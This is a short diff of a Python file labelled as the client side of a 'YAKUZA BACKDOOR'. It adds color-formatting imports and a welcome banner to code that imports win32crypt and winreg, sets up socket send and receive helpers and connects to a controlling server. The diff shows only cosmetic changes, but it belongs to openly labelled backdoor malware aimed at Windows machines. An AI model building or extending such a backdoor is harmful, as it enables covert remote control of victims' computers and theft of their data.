@@ -28,7 +28,8 @@ import win32event
 import win32crypt
 
 from winreg import *
-
+from miscs.colors import fColors, bColors
+from miscs.string_format import StringFormat
 
 
 # Step 2: Define Global Variables
@@ -109,6 +110,11 @@ recv = lambda buffer: objSocket.recv(buffer)
 
 send = lambda data: objSocket.send(data)
 
+
+
+# debug print
+print(fColors.BLACK + bColors.WHITE + StringFormat.BOLD +
+            "\n[***] Welcome to YAKUZA BACKDOOR Client Side.! [***]\n" + fColors.RESET)
 
 # Step 8: Connect to Server Implement Main Loop for Connect Client to Server
 server_connect()
